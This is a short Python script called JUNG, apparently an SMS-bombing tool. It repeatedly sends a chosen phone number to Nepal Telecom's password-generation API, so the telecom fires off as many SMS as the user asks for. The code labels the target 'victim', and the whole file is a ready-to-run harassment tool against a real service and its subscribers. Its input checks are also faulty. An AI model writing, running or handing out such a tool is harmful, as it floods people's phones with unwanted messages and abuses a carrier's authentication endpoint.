

from pyfiglet import figlet_format
import requests
import sys


def main():
    print(figlet_format("-------------------------", font="digital"))
    print(figlet_format("| JUNG |"))
    print(figlet_format("Built by SJB!", font="digital"))
    print("Usage:\npython3 JUNG.py [NTC Number] [Number of SMS]\n")
    url = "https://cms.ntc.net.np/api/generateAuthPassword"
    if len(sys.argv) == 1:
        phone = input("Enter the phone number where you want to send SMS: ")
        times = input("How many SMS do you want to send?\n=> ")
        if (len(phone)!=10 and type(times)!= int):
            print("\nPlease re-run JUNG with proper input!\n")
            exit(figlet_format("-------------------------", font="digital"))
    elif len(sys.argv) == 3:
        phone = sys.argv[1]
        times = sys.argv[2]
        if (len(phone)!=10 and type(times)!= int):
            print("\nPlease re-run JUNG with proper input!\n")
            exit(figlet_format("-------------------------", font="digital"))
    else:
        print("Invalid Number of Arguments!\n")
        exit(figlet_format("-------------------------", font="digital"))
    print("\nYou will be sending ",times," SMS to ",phone,".\n", sep="")
    victim = {"phone":phone}
    busterHeader = {
        'Content-Type':'application/json;charset=utf-8'
    }
    print(figlet_format("Data Sent/Lost:", font="digital"))
    if (int(times)==0):
        print("Nothing to send!\n")
    else:
        for i in range(0,int(times)):
            buster = requests.post(url=url,params=victim,headers=busterHeader)
            if (buster.headers.get('Content-Type') == 'application/json'):
                print("=> ",i+1,"SMS Sent!", sep=" ")
        print("\nThe required number of SMS has been sent!\n")
    exit(figlet_format("~~~~~~~~", font="digital"))
main()